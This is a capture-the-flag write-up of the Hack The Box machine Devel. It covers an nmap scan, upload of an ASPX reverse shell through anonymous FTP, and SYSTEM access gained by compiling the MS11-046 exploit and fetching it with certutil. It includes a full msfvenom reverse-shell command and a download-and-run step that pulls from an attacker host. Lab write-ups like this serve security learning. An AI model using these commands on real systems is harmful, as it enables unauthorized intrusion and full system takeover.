# Devel

This is my write-up for the Hack The Box machine called **Devel** located at: [https://app.hackthebox.com/machines/Devel](https://app.hackthebox.com/machines/Devel).

### Exploitation:

I started off of a nmap scan:

![](<../../.gitbook/assets/image (477).png>)

Since HTTP is open, I wanted to see what is offered on it:

![](<../../.gitbook/assets/image (335).png>)

This gave me a hint that the machine is running IIS7 as their software. At this time, my deeper nmap scan (`nmap -T4 -A -v -p- 10.10.10.5 -oN devel.nmap`) had ended:

![](<../../.gitbook/assets/image (693).png>)

From this, I can see that FTP has anonymous login allowed:

![](<../../.gitbook/assets/image (458).png>)

Using `wget -r ftp://anonymous:@10.10.10.5/` I downloaded all of the files in the folder. I then found the following **Metaploit** module:

![](<../../.gitbook/assets/image (596).png>)

I then was able to get into that directory through FTP, and was able to upload files into it:

![](<../../.gitbook/assets/image (680).png>)

![](<../../.gitbook/assets/image (694).png>)

I was trying various files to upload, but the one that ended up working was the ASPX file. I created the file by running the following:

```
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```

I then used **Netcat** to then get the reverse shell:

![](<../../.gitbook/assets/image (626).png>)

At this point, I had a shell, but was not able to read files from the user or the Administrators' folders. I then found [this write-up](https://mrreh.com/hackthebox-devel-writeup/), which clarified what I should be doing. I was supposed to find and run [this exploit](https://www.exploit-db.com/exploits/40564) from exploit-db. I ran the following commands (after I downloaded the exploit):

```
//on my own machine
sudo apt-get install gcc-mingw-w64 //to install the i686-w64-mingw32-gcc command
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 //MS11-046.c is the exploit

//on remote machine
mkdir temp //thus making the C:\Users\Public\temp folder //going to have to CD into it

//on my own machine
python3 -m http.server 80 //host the files

//remote machine
certutil -urlcache -f http://10.10.xx.xx:80/MS11-046.exe MS11-046.exe
MS11-046.exe //should get you NT System Authority
```

I was then able to get the **root.txt** flag:

![](<../../.gitbook/assets/image (354).png>)

I then also got the **user.txt** flag as well:

![](<../../.gitbook/assets/image (618).png>)

### What I learned:

* That I should view the output of **systeminfo** more closely
* The **certutil** command on Windows
* That the **user.txt** file could be renamed to **user.txt.txt**

